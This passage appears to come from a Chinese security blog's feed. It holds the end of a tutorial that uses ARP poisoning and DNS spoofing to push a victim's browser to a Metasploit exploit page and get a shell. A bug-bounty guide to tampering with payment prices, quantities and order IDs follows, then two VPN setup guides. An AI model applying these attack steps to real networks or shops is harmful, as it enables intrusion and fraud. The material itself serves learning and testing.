进入该工具的图形化界面 </p><p>菜单栏选择sniff –&gt; Unified sniffing –&gt;选择上网网卡 </p><p>菜单栏选择Hosts –&gt; Scan for Hosts –&gt; 再点击host list</p><ul><li><p>选择欺骗目标的网关  添加到target1</p></li><li><p>选择欺骗目标的IP 添加到target2</p></li></ul><p>菜单栏选择Mitm–&gt;ARP poisoning–&gt;勾选Sniff remote connections（ARP欺骗）</p><p>菜单栏选择Plugins–&gt;Manage the plugins–&gt;选择dns-spoof（dns欺骗）</p><p>最后，菜单栏中找到start–&gt;start sniffing</p></li></ol><h3 id="2-等待目标使用浏览器"><a href="#2-等待目标使用浏览器" class="headerlink" title="2. 等待目标使用浏览器"></a>2. 等待目标使用浏览器</h3><ol><li><p>目标地址访问任意符合该URL的页面：www.***.com，即可成功跳转至恶意URL</p></li><li><p>访问我们的恶意页面后，该模块会自动选择最合适的exploit，进行攻击利用</p></li><li><p>等待一段时间，直到出现 Successfully migrated to process</p><p><img src="/2019/04/08/Metasploit利用-浏览器自动攻击/1554724873153.png" alt="1554724873153"></p></li><li><p>查看session</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sessions -l</span><br></pre></td></tr></table></figure></li><li><p>选择相应序号</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sessions -i 1</span><br></pre></td></tr></table></figure></li><li><p>getshell</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">shell</span><br></pre></td></tr></table></figure><p><img src="/2019/04/08/Metasploit利用-浏览器自动攻击/1554725111543.png" alt="1554725111543"></p></li></ol>]]></content>
      
      
      <categories>
          
          <category> 学习笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Metasploit </tag>
            
            <tag> 浏览器攻击 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>逻辑漏洞挖掘思路-支付逻辑</title>
      <link href="/2019/04/07/%E9%80%BB%E8%BE%91%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%E6%80%9D%E8%B7%AF-%E6%94%AF%E4%BB%98%E9%80%BB%E8%BE%91/"/>
      <url>/2019/04/07/%E9%80%BB%E8%BE%91%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%E6%80%9D%E8%B7%AF-%E6%94%AF%E4%BB%98%E9%80%BB%E8%BE%91/</url>
      
        <content type="html"><![CDATA[<h2 id="一、现在src关注的重点"><a href="#一、现在src关注的重点" class="headerlink" title="一、现在src关注的重点"></a>一、现在src关注的重点</h2><p>​    随着常规漏洞的风险降低，以及挖掘难度的增加，现在的src更多的关注点，也就是白帽子关注的重点是逻辑漏洞。逻辑漏洞不要求有很深的基础，比如sql注入手工注入需要对sql注入有很深厚的理解；逻辑漏洞只需要对业务逻辑和关键参数有一定的了解，剩下的看运气。</p><a id="more"></a><h2 id="二、刷src之前的准备"><a href="#二、刷src之前的准备" class="headerlink" title="二、刷src之前的准备"></a>二、刷src之前的准备</h2><h3 id="1-信息收集（泛讲）"><a href="#1-信息收集（泛讲）" class="headerlink" title="1. 信息收集（泛讲）"></a>1. 信息收集（泛讲）</h3><p>​    渗透测试和漏洞挖掘，信息收集是贯彻于整个流程的；在进行src挖掘之前，要进行信息收集，在确定漏洞产生什么危害的时候，也要进行信息收集，也就是说渗透测试和漏洞挖掘的本质就是信息收集。</p><h3 id="2-具体要收集哪些信息"><a href="#2-具体要收集哪些信息" class="headerlink" title="2. 具体要收集哪些信息"></a>2. 具体要收集哪些信息</h3><ol><li><p>厂商域名和IP段（测试范围界定）</p><p>主站（可能防护较好），子站（子域名收集）</p><p>（明确测试范围，如果查出范围，有可能承担法律风险）</p></li><li><p>厂商业务信息（规划）</p><ul><li><p>如果业务架构较小，漏洞有限，不必去深挖</p></li><li><p>如果业务架构非常大，可以持久的挖</p></li></ul></li><li><p>子域名收集</p></li><li><p>IP段</p></li><li><p>端口（端口对应业务）</p></li><li><p>精准字典</p><ul><li><p>社工字典（站长信息，站点信息），</p><p>提高准确度，也增强自己的能力</p></li><li><p>不断收集字典，常见的（例：国人100弱密码）</p></li></ul></li><li><p>敏感接口</p><p>蛋糕那么小，人那么多，如果不选择一些不引人注意的范围进行利用的话，可能连粥都没得喝（简单例：如果接口外露，可以频繁的发起短信轰炸）</p></li><li><p>其他信息等</p></li></ol><h3 id="3-需要准备什么工具"><a href="#3-需要准备什么工具" class="headerlink" title="3. 需要准备什么工具"></a>3. 需要准备什么工具</h3><p>Burp suite and fiddler、Browser浏览器</p><p>或者仅需浏览器即可</p><h2 id="三、挖掘思路"><a href="#三、挖掘思路" class="headerlink" title="三、挖掘思路"></a>三、挖掘思路</h2><h3 id="1-锁定关键变量与深入逻辑"><a href="#1-锁定关键变量与深入逻辑" class="headerlink" title="1. 锁定关键变量与深入逻辑"></a>1. 锁定关键变量与深入逻辑</h3><ul><li><p>锁定关键可控变量</p></li><li><p>深入了解逻辑，进一步绕过</p></li></ul><p>​    不是单纯的靠工具跑出来，用工具跑出来的漏洞，不能叫漏洞了，因为没有你任何价值的体现。</p><p>​    例如sql注入关键变量是一个id的话，此时就要深入的判断它的一些字符型、数字型以及对它的逻辑进一步去挖掘。</p><p>​    所以说不管挖哪些漏洞，其实本质就是这个样子的，首先锁定一个关键的漏洞，紧接着深入了解一下他的逻辑具体是什么样子的，然后进一步的进行绕过。</p><h3 id="2-逻辑漏洞的定义"><a href="#2-逻辑漏洞的定义" class="headerlink" title="2. 逻辑漏洞的定义"></a>2. 逻辑漏洞的定义</h3><p>由于程序逻辑不严谨，导致逻辑未能正常处理或处理错误的漏洞成为逻辑漏洞。</p><p>零信任原则：不管用户输入任何东西，都是零信任的。</p><h3 id="3-了解逻辑业务"><a href="#3-了解逻辑业务" class="headerlink" title="3. 了解逻辑业务"></a>3. 了解逻辑业务</h3><p>如果不了解业务，就开始找漏洞，可能就会陷入盲目，比较费时间，并且没有任何成果，打消自己的自信力；所以先对业务有一定的了解，哪个模块可能会出现那些漏洞</p><p>例如表单，一般会跟数据库有交互，就可能存在sql注入</p><p>以下为参考</p><ul><li>电商行业</li></ul><p><img src="/2019/04/07/逻辑漏洞挖掘思路-支付逻辑/1554553268179.png" alt="1554553268179"></p><ul><li>P2P金融</li></ul><p><img src="/2019/04/07/逻辑漏洞挖掘思路-支付逻辑/1554553286437.png" alt="1554553286437"></p><h2 id="四、支付漏洞挖掘"><a href="#四、支付漏洞挖掘" class="headerlink" title="四、支付漏洞挖掘"></a>四、支付漏洞挖掘</h2><p>在支付环节中由于逻辑不严谨而产生的漏洞称为支付漏洞</p><p>src不会拒绝的，其他的可能会打擦边球，但是涉及到钱的问题，对商家或厂家是重中之重</p><h3 id="1-明确挖洞步骤"><a href="#1-明确挖洞步骤" class="headerlink" title="1. 明确挖洞步骤"></a>1. 明确挖洞步骤</h3><ol><li>明确支付点</li><li>寻找关键可控变量</li><li>抓包放包对比</li></ol><h3 id="2-技巧"><a href="#2-技巧" class="headerlink" title="2. 技巧"></a>2. 技巧</h3><ul><li><p>两个账号A、B</p></li><li><p>A走一遍流程；</p></li><li><p>B负责在A账号正常流程破坏的</p></li></ul><p>例：找回密码</p><h3 id="3-支付流程"><a href="#3-支付流程" class="headerlink" title="3. 支付流程"></a>3. 支付流程</h3><p>用户订购：</p><ul><li>信息泄露/越权<ul><li>id+/-</li></ul></li></ul><p>↓</p><p>金额：</p><ul><li><p>修改金额</p><ul><li>正负逻辑</li><li>0.01模式</li><li>最大值越界</li></ul></li><li><p>积分换购</p><ul><li>积分抵扣</li><li>积分兑换</li></ul></li></ul><p>↓</p><p>生成订单：</p><ul><li>更改状态<ul><li>接口更改</li><li>更改关键值</li></ul></li></ul><p>↓</p><p>扣除金额</p><p>↓</p><p>库存 - 1</p><ul><li>多线程并发（-99999999）影响交易</li></ul><p>↓</p><p>收货阶段</p><ul><li>确认收货<ul><li>绕过客户直接确认收货</li></ul></li><li>退货<ul><li>更改货物状态</li><li>更改退货价格</li></ul></li></ul><h3 id="4-具体思路"><a href="#4-具体思路" class="headerlink" title="4. 具体思路"></a>4. 具体思路</h3><p><strong>一、订单模块</strong></p><ol><li>下单之后修改商品价格</li><li>下单之后更改数量设为负数，产生正负逻辑</li><li>并发购买是否出现逻辑问题</li><li>商品为0，是否存在购买的可能</li><li>生成订单时修改订单金额</li></ol><p><strong>二、结算模块</strong></p><ol><li>优惠劵重复利用</li><li>修改结算的状态</li><li>更改支付的API或者支付模式（转为第三方）</li><li>伪造成功结算的请求</li></ol><p><strong>三、退货模块</strong></p><ol><li>更改货物状态</li><li>更改退货价格</li></ol><p><strong>四、收货模块</strong></p><ol><li>绕过客户直接确认收货</li></ol><h3 id="5-具体场景"><a href="#5-具体场景" class="headerlink" title="5. 具体场景"></a>5. 具体场景</h3><p><img src="/2019/04/07/逻辑漏洞挖掘思路-支付逻辑/1554555632056.png" alt="1554555632056"></p><h3 id="6-举例"><a href="#6-举例" class="headerlink" title="6. 举例"></a>6. 举例</h3><h4 id="1-信息泄露-越权"><a href="#1-信息泄露-越权" class="headerlink" title="1. 信息泄露/越权"></a>1. 信息泄露/越权</h4><p><strong>例1：</strong></p><p>第一步：明确支付点：购票</p><p>第二步：寻找关键可控变量</p><p>关键变量：</p><ul><li>订单id和用户id（变量未加密）</li><li>变量加密<ul><li>前端JS加密</li><li>Ajax异步加载请求</li><li>后端加密</li></ul></li></ul><p>第三步：抓包放包对比</p><ul><li>订单id增减，用户id增减，同时增减（平行越权造成订单信息泄露）</li></ul><p><strong>例2：</strong></p><p>第一步：明确支付点：酒店预订</p><p>第二步：寻找关键可控变量</p><ul><li>关键变量：订单id和价格变量（变量未加密）</li></ul><p>第三步：抓包放包对比</p><p>订单id增减，实现订单遍历</p><h4 id="2-正负逻辑：修改数量"><a href="#2-正负逻辑：修改数量" class="headerlink" title="2. 正负逻辑：修改数量"></a>2. 正负逻辑：修改数量</h4><p><strong>例3：</strong></p><p>第一步：明确支付点：购买商品</p><p>第二步：寻找关键可控变量（币的数量）</p><ul><li>关键变量：价格变量（变量未加密）</li></ul><p>第三步：抓包放包对比</p><p>更改价格（币的数量）</p><p><strong>例4：</strong></p><p>第一步：明确支付点：积分换币</p><p>第二步：寻找关键可控变量</p><ul><li>关键变量：币数量（变量未加密）</li></ul><p>第三步：抓包放包对比</p><p>更改币的数量</p><h4 id="3-正负逻辑：支付价格变动"><a href="#3-正负逻辑：支付价格变动" class="headerlink" title="3. 正负逻辑：支付价格变动"></a>3. 正负逻辑：支付价格变动</h4><p><strong>例5：</strong></p><p>第一步：明确支付点：购物</p><p>第二步：寻找关键可控变量</p><ul><li>关键变量：价格变量（变量未加密）</li></ul><p>第三步：抓包放包对比</p><p>更改Price可增加余额</p><h4 id="4-正负逻辑：修改附属值"><a href="#4-正负逻辑：修改附属值" class="headerlink" title="4. 正负逻辑：修改附属值"></a>4. 正负逻辑：修改附属值</h4><p><strong>例6：</strong></p><p>第一步：明确支付点：兑换物品（积分+金额模式付款）</p><p>第二步：寻找关键可控变量</p><ul><li>关键变量：金额变量（变量未加密）</li></ul><p>第三步：抓包放包对比</p><p>金额变量变化，最终支付价格也会变化</p><h4 id="5-0-01模式"><a href="#5-0-01模式" class="headerlink" title="5. 0.01模式"></a>5. 0.01模式</h4><p>0.01模式：逻辑判断价格不能为负数</p><p><strong>例7：</strong></p><p>第一步：明确支付点：购买保险</p><p>第二步：寻找关键可控变量</p><ul><li>关键变量：金额变量（一个或多个）（变量未加密）</li></ul><p>第三步：抓包放包对比</p><p>金额变量变化，最终支付价格也会变化</p><p>### </p><h2 id="五、支付漏洞修复建议"><a href="#五、支付漏洞修复建议" class="headerlink" title="五、支付漏洞修复建议"></a>五、支付漏洞修复建议</h2><p><img src="/2019/04/07/逻辑漏洞挖掘思路-支付逻辑/1554557520785.png" alt="1554557520785"></p><h2 id="六、漏洞报告"><a href="#六、漏洞报告" class="headerlink" title="六、漏洞报告"></a>六、漏洞报告</h2><p>漏洞报告最好具有规范性</p><p><strong>一般内容</strong>：</p><ul><li><p>漏洞标题</p></li><li><p>漏洞等级</p></li><li><p>漏洞影响范围</p></li><li><p>漏洞证明信息</p></li><li><p>漏洞修复建议</p></li></ul>]]></content>
      
      
      <categories>
          
          <category> 技术文章 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 业务逻辑漏洞 </tag>
            
            <tag> 支付逻辑漏洞 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Windows 2008 R2 搭建VPN服务</title>
      <link href="/2019/04/07/Windows-2008-R2-%E6%90%AD%E5%BB%BAVPN%E6%9C%8D%E5%8A%A1/"/>
      <url>/2019/04/07/Windows-2008-R2-%E6%90%AD%E5%BB%BAVPN%E6%9C%8D%E5%8A%A1/</url>
      
        <content type="html"><![CDATA[<h1 id="一、介绍"><a href="#一、介绍" class="headerlink" title="一、介绍"></a>一、介绍</h1><p>​    虚拟私人网络（Virtual Private Network，缩写为VPN）是一种常用于连接中、大型企业或团体与团体间的私人网络的通讯方法。它利用隧道协议（Tunneling Protocol）来达到保密、发送端认证、消息准确性等私人消息安全效果，这种技术可以用不安全的网络（例如：互联网）来发送可靠、安全的消息。</p><pre><code>通常情况下，VPN网关采取双网卡结构，外网卡使用公网IP接入Internet。</code></pre> <a id="more"></a><h1 id="二、搭建步骤"><a href="#二、搭建步骤" class="headerlink" title="二、搭建步骤"></a>二、搭建步骤</h1><ol><li>安装VPN服务，打开服务器管理器-添加角色</li></ol><p><img src="/2019/04/07/Windows-2008-R2-搭建VPN服务/wps1.jpg" alt="img"> </p><ol start="2"><li>点击添加角色，下一步，勾选网络策略和访问服务，下一步是网络策略访问的简介</li></ol><p><img src="/2019/04/07/Windows-2008-R2-搭建VPN服务/wps2.jpg" alt="img"> </p><ol start="3"><li>勾选网络策略服务器，和路由访问，然后下一步，继续安装</li></ol><p><img src="/2019/04/07/Windows-2008-R2-搭建VPN服务/wps3.jpg" alt="img"> </p><ol start="4"><li>安装完成</li></ol><p><img src="/2019/04/07/Windows-2008-R2-搭建VPN服务/wps4.jpg" alt="img"> </p><ol start="5"><li>安装完成之后，在服务器管理器中找到路由和远程访问，并且进行配置</li></ol><p><img src="/2019/04/07/Windows-2008-R2-搭建VPN服务/wps5.jpg" alt="img"> </p><ol start="6"><li>配置点击下一步，选择自定义配置</li></ol><p><img src="/2019/04/07/Windows-2008-R2-搭建VPN服务/wps6.jpg" alt="img"> </p><ol start="7"><li>然后下一步勾选VPN访问，点击完成即可！</li></ol><p><img src="/2019/04/07/Windows-2008-R2-搭建VPN服务/wps7.jpg" alt="img"> </p><p><img src="/2019/04/07/Windows-2008-R2-搭建VPN服务/wps8.jpg" alt="img"> </p><ol start="8"><li>完成之后需要启动路由和远程访问功能</li></ol><p><img src="/2019/04/07/Windows-2008-R2-搭建VPN服务/wps9.jpg" alt="img"> </p><ol start="9"><li>安装完成之后，开始配置VPN，找到路由和远程访问，IPV4展开之后，出现常规，选中常规右键新增路由协议</li></ol><p><img src="/2019/04/07/Windows-2008-R2-搭建VPN服务/wps10.jpg" alt="img"> </p><ol start="10"><li>在添加的路由协议中，选择NAT路由协议。</li></ol><p><img src="/2019/04/07/Windows-2008-R2-搭建VPN服务/wps11.jpg" alt="img"> </p><ol start="11"><li>上步选择了NAT，现在配置NAT，在NAT上右键新增接口</li></ol><p><img src="/2019/04/07/Windows-2008-R2-搭建VPN服务/wps12.jpg" alt="img"> </p><ol start="12"><li>然后把“内部”接口也添加上，并“右键”——”属性“如下设置：</li></ol><p><img src="/2019/04/07/Windows-2008-R2-搭建VPN服务/wps13.jpg" alt="img"> </p><p><img src="/2019/04/07/Windows-2008-R2-搭建VPN服务/wps14.jpg" alt="img"> </p><ol start="13"><li>创建VPN帐号，测试VPN服务器是否正常。在计算机右键管理，选择配置，本地用户和组，还要把拨入属性选项卡中的网络访问权限选择为 允许访问。</li></ol><p><img src="/2019/04/07/Windows-2008-R2-搭建VPN服务/wps15.jpg" alt="img"> </p><ol start="14"><li>至此，完成了VPN服务器端的配置</li></ol><h1 id="三、连接测试"><a href="#三、连接测试" class="headerlink" title="三、连接测试"></a>三、连接测试</h1><p>​    使用另外一台不同网段的机器，新建VPN拨号连接，登录VPN服务器上的测试帐号</p><ol><li>配置连接属性</li></ol><p><img src="/2019/04/07/Windows-2008-R2-搭建VPN服务/wps16.jpg" alt="img"> </p><ol start="2"><li>开始连接 </li></ol><p><img src="/2019/04/07/Windows-2008-R2-搭建VPN服务/wps17.jpg" alt="img"> </p><ol start="3"><li>连接成功 </li></ol><p><img src="/2019/04/07/Windows-2008-R2-搭建VPN服务/wps18.jpg" alt="img"> </p><ol start="4"><li>查看IP </li></ol><p><img src="/2019/04/07/Windows-2008-R2-搭建VPN服务/wps19.jpg" alt="img"> </p><ol start="5"><li>本机IP </li></ol><p><img src="/2019/04/07/Windows-2008-R2-搭建VPN服务/wps20.jpg" alt="img"> </p><p>至此，完成了VPN客户端的连接</p>]]></content>
      
      
      <categories>
          
          <category> 学习笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Windows Server </tag>
            
            <tag> OpenVPN </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Ubuntu16搭建OpenVPN服务</title>
      <link href="/2019/04/07/Ubuntu16%E4%B8%8B%E6%90%AD%E5%BB%BAOpenVPN%E6%9C%8D%E5%8A%A1/"/>
      <url>/2019/04/07/Ubuntu16%E4%B8%8B%E6%90%AD%E5%BB%BAOpenVPN%E6%9C%8D%E5%8A%A1/</url>
      
        <content type="html"><![CDATA[<h2 id="一、参考"><a href="#一、参考" class="headerlink" title="一、参考"></a>一、参考</h2><p><a href="https://blog.csdn.net/u012843189/article/details/77422505" target="_blank" rel="noopener">Ubuntu16.04搭建OpenVPN</a><br><a href="https://cndaqiang.github.io/2017/09/27/ubuntu1604-openvpn/" target="_blank" rel="noopener">Ubuntu16.04搭建openvpn服务器</a></p><h2 id="二、环境"><a href="#二、环境" class="headerlink" title="二、环境"></a>二、环境</h2><p>Ubuntu 16.10 yakkety (GNU/Linux 4.8.0-22-generic x86_64)</p><h2 id="三、介绍"><a href="#三、介绍" class="headerlink" title="三、介绍"></a>三、介绍</h2><p><strong>VPN</strong>（Virtual Private Network，虚拟私人网络）是一种常用于连接中、大型企业或团体与团体间的私人网络的通讯方法。它利用<a href="https://zh.wikipedia.org/wiki/%E9%9A%A7%E9%81%93%E5%8D%8F%E8%AE%AE" target="_blank" rel="noopener">隧道协议</a>（Tunneling Protocol）来达到保密、发送端认证、消息准确性等私人消息安全效果，这种技术可以用不安全的网络（例如：互联网）来发送可靠、安全的消息。</p><h2 id="四、安装"><a href="#四、安装" class="headerlink" title="四、安装"></a>四、安装</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get update</span><br><span class="line">sudo apt-get install openvpn easy-rsa</span><br></pre></td></tr></table></figure><a id="more"></a><p><code>easy-rsa</code>内部CA（certificate authority）证书生成软件</p><p><img src="/2019/04/07/Ubuntu16下搭建OpenVPN服务/1554386400868.png" alt="1554386400868"></p><h2 id="五、证书制作"><a href="#五、证书制作" class="headerlink" title="五、证书制作"></a>五、证书制作</h2><h3 id="1-证书配置"><a href="#1-证书配置" class="headerlink" title="1. 证书配置"></a>1. 证书配置</h3><p>复制证书制作工具到文件夹(该文件夹应该不存在，复制后自动创建该文件夹)，<code>make-cadir</code>为easy-rsa安装后增加的命令 </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">make-cadir /etc/openvpn/ca</span><br><span class="line">cd /etc/openvpn/ca</span><br></pre></td></tr></table></figure><p>更改证书默认设置</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo vim vars</span><br></pre></td></tr></table></figure><p>以下内容为证书的默认内容，可自定义，不能为空</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">export KEY_COUNTRY=&quot;US&quot;</span><br><span class="line">export KEY_PROVINCE=&quot;CA&quot;</span><br><span class="line">export KEY_CITY=&quot;SanFrancisco&quot;</span><br><span class="line">export KEY_ORG=&quot;Fort-Funston&quot;</span><br><span class="line">export KEY_EMAIL=&quot;me@myhost.mydomain&quot;</span><br><span class="line">export KEY_OU=&quot;MyOrganizationalUnit&quot;</span><br></pre></td></tr></table></figure><p><img src="/2019/04/07/Ubuntu16下搭建OpenVPN服务/1554386592562.png" alt="1554386592562"></p><p>下面有个KEY_NAME，值可自定义，例如heiheihei</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">export KEY_NAME=&quot;heiheihei&quot;</span><br></pre></td></tr></table></figure><p>保存退出</p><p>现在可以使用刚才设置的变量，用easy-rsa包来制作CA。确保在CA目录下面，然后source编辑过的vars文件。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">source vars</span><br></pre></td></tr></table></figure><p>如果source正确的话，会看到如下信息：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">NOTE: If you run ./clean-all, I will be doing a rm -rf on /etc/openvpn/ca/keys</span><br></pre></td></tr></table></figure><p><img src="/2019/04/07/Ubuntu16下搭建OpenVPN服务/1554386666693.png" alt="1554386666693"></p><h3 id="2-CA证书"><a href="#2-CA证书" class="headerlink" title="2. CA证书"></a>2. CA证书</h3><p>CA数字证书认证机构,负责颁发证书，用于openvpn服务器和客户端的认证</p> <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">./clean-all//确保我们的操作处于一个clean环境中</span><br><span class="line">./build-ca//之后需要一直回车确认</span><br><span class="line">./build-ca [--batch]//保持默认设置，无须回车确认</span><br></pre></td></tr></table></figure><p><img src="/2019/04/07/Ubuntu16下搭建OpenVPN服务/1554387418885.png" alt="1554387418885"></p><h3 id="3-服务器证书"><a href="#3-服务器证书" class="headerlink" title="3. 服务器证书"></a>3. 服务器证书</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./build-key-server --batch heiheihei</span><br></pre></td></tr></table></figure><p><img src="/2019/04/07/Ubuntu16下搭建OpenVPN服务/1554429618321.png" alt="1554429618321"></p><p>heiheihei为之前vars里<code>export KEY_NAME=&quot;heiheihei&quot;</code>的值，自定义后，后面需要修改服务器配置文件中相应内容。</p><p>client名称也可自定义,如果修改，最后在客户端配置文件中，也更改对应名称。</p><h3 id="4-制作Diffie-Hellman-key"><a href="#4-制作Diffie-Hellman-key" class="headerlink" title="4. 制作Diffie-Hellman key"></a>4. 制作Diffie-Hellman key</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./build-dh</span><br></pre></td></tr></table></figure><p><img src="/2019/04/07/Ubuntu16下搭建OpenVPN服务/1554429922860.png" alt="1554429922860"></p><p>等待几分钟时间完成</p><h3 id="5-生成HMAC签名加强TLS认证"><a href="#5-生成HMAC签名加强TLS认证" class="headerlink" title="5. 生成HMAC签名加强TLS认证"></a>5. 生成HMAC签名加强TLS认证</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">openvpn --genkey --secret keys/ta.key</span><br></pre></td></tr></table></figure><h3 id="6-客户端证书"><a href="#6-客户端证书" class="headerlink" title="6. 客户端证书"></a>6. 客户端证书</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./build-key --batch client</span><br></pre></td></tr></table></figure><p>client名称可自定义,如果修改需要后面在客户端配置文件中，更改对应内容</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cert client.crt</span><br><span class="line">key client.key</span><br></pre></td></tr></table></figure><h2 id="六、服务端配置"><a href="#六、服务端配置" class="headerlink" title="六、服务端配置"></a>六、服务端配置</h2><h3 id="1-移动证书"><a href="#1-移动证书" class="headerlink" title="1. 移动证书"></a>1. 移动证书</h3><p>进入keys目录可以看到生成的证书文件 我们需要<strong>ca.crt ca.key heiheihei.crt heiheihei.key ta.key dh2048.pem</strong> ，heiheihei为之前自定义的服务器证书名</p><p><img src="/2019/04/07/Ubuntu16下搭建OpenVPN服务/1554430607611.png" alt="1554430607611"></p><p>复制证书文件到/etc/openvpn 当前目录是<code>/etc/openvpn/ca/keys</code>，所以<code>../../</code>就是配置目录</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cp ca.crt ca.key uuu.crt uuu.key ta.key dh2048.pem ../../</span><br></pre></td></tr></table></figure><h3 id="2-修改配置文件"><a href="#2-修改配置文件" class="headerlink" title="2. 修改配置文件"></a>2. 修改配置文件</h3><p>复制配置文件模板到<code>/etc/openvpn/</code>,解压后修改</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">cp /usr/share/doc/openvpn/examples/sample-config-files/server.conf.gz .</span><br><span class="line">gzip -d server.conf.gz</span><br><span class="line">sudo vim server.conf</span><br></pre></td></tr></table></figure><p>以下内容替换为证书的路径名称，同路径下可直接写名称</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">ca ca.crt</span><br><span class="line">cert server.crt</span><br><span class="line">key server.key </span><br><span class="line"></span><br><span class="line">dh dh2048.pem</span><br></pre></td></tr></table></figure><p>这里我替换成</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">ca ca.crt</span><br><span class="line">cert heiheihei.crt</span><br><span class="line">key heiheihei.key</span><br><span class="line"></span><br><span class="line">dh dh2048.pem</span><br></pre></td></tr></table></figure><p><img src="/2019/04/07/Ubuntu16下搭建OpenVPN服务/1554430900402.png" alt="1554430900402"></p><p>如果服务器证书一开始就命名为server默认值，这里就不用修改了</p><p>去掉下面的注释，并再下一行添加<code>key-direction 0</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">;tls-auth ta.key 0 # This file is secret</span><br></pre></td></tr></table></figure><p><img src="/2019/04/07/Ubuntu16下搭建OpenVPN服务/1554431450577.png" alt="1554431450577"></p><p>最后，找到user和group参数，去除它们之前的<code>;</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">;user nobody</span><br><span class="line">;group nogroup</span><br></pre></td></tr></table></figure><p><img src="/2019/04/07/Ubuntu16下搭建OpenVPN服务/1554431475663.png" alt="1554431475663"></p><p><strong>（可选配置）推动DNS更改让VPN重定向所有流量</strong></p><p>上面的配置可以在客户端和服务器端上创建VPN连接，但是没有强迫连接去使用tunnel。如果希望用VPN来路由所有流量，需要更改客户端机器的DNS设置。</p><p><img src="/2019/04/07/Ubuntu16下搭建OpenVPN服务/1554431815982.png" alt="1554431815982"></p><p>这样就可以协助客户版重新配置DNS，以便使用VPN tunnel来作为默认网关。</p><p><strong>（可选配置）修改OpenVPN服务器的端口和协议</strong></p><p><img src="/2019/04/07/Ubuntu16下搭建OpenVPN服务/1554431906735.png" alt="1554431906735"></p><p>如果没有更换端口的需求，最好将上述的两项保持默认设置。</p><h3 id="3-防火墙设置"><a href="#3-防火墙设置" class="headerlink" title="3. 防火墙设置"></a>3. 防火墙设置</h3><h4 id="1-打开ip转发"><a href="#1-打开ip转发" class="headerlink" title="1. 打开ip转发"></a>1. 打开ip转发</h4><p>我们需要让服务器来转发流量，这是需要VPN服务器来提供的最基本的功能。可以通过修改/etc/sysctl.conf文件来调整网络设置：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo vim /etc/sysctl.conf</span><br></pre></td></tr></table></figure><p>取消注释<code>net.ipv4.ip_forward</code>，完成后保存并退出</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net.ipv4.ip_forward=1</span><br></pre></td></tr></table></figure><p>读取sysctl.conf文件并且让调整后设置对当前系统的session生效</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo sysctl -p</span><br></pre></td></tr></table></figure><p><img src="/2019/04/07/Ubuntu16下搭建OpenVPN服务/1554432065420.png" alt="1554432065420"></p><h4 id="2-添加规则"><a href="#2-添加规则" class="headerlink" title="2. 添加规则"></a>2. 